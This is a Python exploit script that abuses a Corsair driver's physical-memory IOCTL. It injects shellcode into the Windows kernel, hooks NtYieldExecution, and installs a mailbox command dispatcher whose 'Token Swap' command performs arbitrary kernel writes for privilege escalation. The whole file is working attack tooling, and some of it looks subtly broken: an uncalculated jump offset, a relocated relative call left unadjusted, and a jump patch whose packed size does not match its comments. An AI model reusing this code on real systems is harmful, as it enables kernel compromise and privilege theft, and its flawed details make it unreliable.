import ctypes
import struct
import sys

# CAT SHADOW HACKER - PHASE 2: KERNEL FUNCTIONALIZATION
# MISSION: UPGRADE HEARTBEAT STUB TO FULL COMMAND DISPATCHER

# Target: nt!NtYieldExecution (Latest known on Physical Host)
HOOK_VA = 0xFFFFF80493D111D0
HOOK_PA = 0x1007111D0
# Signature: 48 83 ec 28 33 c9 e8 15 00 00 00 48 83 c4 28 c3
EXPECTED_SIG = bytes([0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3])

# Cave for our Dispatcher
CAVE_VA = 0xFFFFF80493D111E0
CAVE_PA = 0x1007111E0

# Shared Mailbox
MAILBOX_VA = (CAVE_VA & ~0xFFF) + 0xF00
MAILBOX_PA = (CAVE_PA & ~0xFFF) + 0xF00

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa_base = pa & ~0xFFF
    inp = struct.pack("<QII", pa_base, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def write_phys(h, pa, data):
    v = map_page(h, pa)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def construct_dispatcher_stub():
    """
    Constructs the Phase 2 Command Dispatcher Shellcode.
    Mailbox Layout:
    +0x00: Command ID (4 bytes)
    +0x04: Status (4 bytes)
    +0x10: Arg1 (8 bytes) - e.g., Physical Address
    +0x18: Arg2 (8 bytes) - e.g., Value
    +0x20: Result (8 bytes)
    +0x30: Heartbeat (1 byte) - 0x77
    """
    
    stub = [
        0x50, 0x51, 0x52, 0x41, 0x50,               # push rax, rcx, rdx, r8
        0x48, 0xB9,                                 # mov rcx, MAILBOX_VA
    ] + list(struct.pack("<Q", MAILBOX_VA)) + [
        0x8B, 0x01,                                 # mov eax, [rcx] (Command ID)
        0x85, 0xC0,                                 # test eax, eax
        0x74, 0x30,                                 # jz heartbeat (Offset to be calculated)
        
        # Dispatcher Logic
        0x83, 0xF8, 0x03,                           # cmp eax, 3 (Token Swap)
        0x75, 0x1A,                                 # jne clear_cmd
        
        # Command 0x03: Token Swap
        # TargetAddr = [rcx + 0x10]
        # NewValue   = [rcx + 0x18]
        0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
        0x4C, 0x8B, 0x41, 0x18,                     # mov r8, [rcx + 0x18]
        0x49, 0x89, 0x02,                           # mov [rdx], r8
        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
        0xEB, 0x07,                                 # jmp clear_cmd
        
        # clear_cmd:
        0xC7, 0x01, 0x00, 0x00, 0x00, 0x00,         # mov dword ptr [rcx], 0 (Cmd=Idle)
        
        # heartbeat:
        0xC6, 0x41, 0x30, 0x77,                     # mov byte ptr [rcx + 0x30], 0x77
        
        0x41, 0x58, 0x5A, 0x59, 0x58,               # pop r8, rdx, rcx, rax
        
        # Original Preamble of NtYieldExecution
        0x48, 0x83, 0xEC, 0x28,                     # sub rsp, 28h
        0x33, 0xC9,                                 # xor ecx, ecx
        0xE8, 0x15, 0x00, 0x00, 0x00,               # call nt!KeYieldExecution
        0x48, 0x83, 0xC4, 0x28, 0xC3,               # add rsp, 28h; ret
        
        # Jump Back
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,         # jmp qword ptr [rip]
    ] + list(struct.pack("<Q", HOOK_VA + 16))
    
    return bytes(stub)

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    print(f"[*] Constructing Phase 2 Dispatcher Stub...")
    stub = construct_dispatcher_stub()
    print(f"[*] Stub size: {len(stub)} bytes")

    print(f"[*] Writing upgraded stub to cave at PA 0x{CAVE_PA:X}...")
    if not write_phys(h, CAVE_PA, stub):
        print("[-] Failed to write stub")
        return

    # Hijack (14 bytes absolute jmp)
    # 48 B8 [VA] FF E0 (mov rax, VA; jmp rax) is 12 bytes.
    # FF 25 00 00 00 00 [VA] is 14 bytes.
    abs_jmp = struct.pack("<HIIQ", 0x25FF, 0, 0, CAVE_VA) + b"\x90\x90"
    
    print("[!] INJECTING PHASE 2 DISPATCHER INTO PHYSICAL KERNEL...")
    if not write_phys(h, HOOK_PA, abs_jmp):
        print("[-] Hijack failed")
        return

    print("[+] SUCCESS! Phase 2 Dispatcher is active.")
    print(f"[*] Mailbox ready at PA 0x{MAILBOX_PA:X} / VA 0x{MAILBOX_VA:X}")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
